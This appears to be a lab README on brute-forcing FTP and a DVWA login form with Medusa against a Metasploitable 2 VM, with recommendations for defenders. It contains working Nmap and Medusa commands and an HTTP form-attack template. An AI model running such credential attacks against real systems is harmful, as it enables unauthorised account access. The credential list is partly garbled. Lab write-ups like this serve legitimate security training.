# Brute Force Attack Simulation with Medusa

This repository documents a practical brute-force attack simulation using the **Medusa** tool on Kali Linux, targeting a Metasploitable 2 machine.

The goal of this study is to understand post-information gathering techniques, service exploitation, credential validation, and authentication attacks on services such as **FTP** and **HTTP (DVWA)**, all within an educational and controlled environment.

---

## Environment Used

The simulation was conducted in an isolated and controlled virtualized environment, as detailed below:

| Component | Description | 
| :----- | :----- | 
| **Attacking Host** | Kali Linux (via VirtualBox) | 
| **Target Host** | Metasploitable 2 (via VirtualBox) | 
| **Tools** | Medusa, Nmap, FTP client | 
| **Network** | Host-Only / 192.168.56.0/24 | 

---

## Attack Flow

The attack followed the steps below:

### 1. Connectivity Check

First, communication between Kali Linux and Metasploitable 2 was tested to ensure the target was active on the network.

`ping 192.168.56.102`

**Result:** `host active, no packet loss.`


Next, a ping limited to 3 packets:

`ping -c 3 192.168.56.102`

## 2. Nmap Scan (Service Discovery)

Using Nmap, important exposed services running on Metasploitable 2 were identified, focusing on common authentication service ports.

`nmap -sV -p 21,22,80,445,139 192.168.56.102`

**Detected Services:**

* **FTP** — `vsftpd` 2.3.4 (Port 21)

* **SSH** — `OpenSSH` 4.7p1 (Port 22)

* **HTTP** — `Apache` 2.2.8 (Port 80)

* **Samba** — ports 139 and 445

These services were subsequently targeted for brute-force authentication attempts.

## 3. Manual FTP Test

An initial manual authentication test on the FTP service confirmed the need for an automated attack to discover valid credentials.

`ftp 192.168.56.102`

Attempting to use the user admin resulted in failure.

## 4. Wordlist Creation

Simple user and password lists (wordlists) were created for the simulation:

**User List (`users.txt`)**

`echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt`

**Password List (`pass.txt`)**

`echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt`

## 5. Brute Force Attack with Medusa (FTP Service)

The brute-force attack was executed against the FTP service using Medusa and the created wordlists.

**Execution:**

`medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6`

**Credential Found:**

* `User: msfadmin`

* `Pass: msfadmin`

The credential was manually validated:

`ftp 192.168.56.102`

**Result:** `Login successful.`

## 6. Brute Force via HTTP (DVWA)

The attack was replicated against the login page of the DVWA (Damn Vulnerable Web Application) running on port 80. A new user list was used to include variations.

**Execution:**

```
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
```

**Valid Credentials Found:**
Various credentials were found to be valid, demonstrating failures in the application's password policy, including:

adminmsfadmin : password

* `adminmsfadmin : password`

* `a user : msfadmin`

* `admin : 123456`

* `root : 123456`

* `root : password`

* `a user : password`

* `a user : qwerty`

## 7. Conclusions

The simulation demonstrated the extreme vulnerability of the Metasploitable 2 system, which is intentionally insecure. The main security lessons highlighted are:

1. **Lack of Brute Force Protection:** Exposed services (FTP, HTTP) lacked mechanisms to protect against automated attacks.

2. **Weak Credentials:** The ease and speed with which common credentials (including the default `msfadmin:msfadmin`) were cracked underscores the importance of robust password policies.

## Security Recommendations

To mitigate this type of attack, it is crucial to implement the following measures:

* **Strong Password Policies:** Enforce the use of long and complex passwords.

* **Lockout Mechanisms:** Implement account lockout after a small number of failed attempts (e.g., 5).

* **Limit Service Exposure:** Restrict the exposure of network services to only what is necessary, using firewalls or access lists.

* **Additional Web Controls:** Add CAPTCHA, Rate Limiting, or Two-Factor Authentication (2FA) to web portals.

This project demonstrates, in a controlled and educational environment, how relatively simple attacks can compromise misconfigured systems.

## 8. How to Run the Simulation Script
The script run_bruteforce_simulation.sh automates steps 1 through 6 of this simulation (excluding manual validation tests).

**Prerequisites**

Ensure that Kali Linux and the Metasploitable 2 machine are active on the 192.168.56.0/24 network and that Medusa and Nmap are installed.

**Execution:** Grant execute permission to the script:

`chmod +x run_bruteforce_simulation.sh`

**Execute the script:**

`./run_bruteforce_simulation.sh`

The script will clean up the wordlists (`users.txt` and `pass.txt`) after completion.


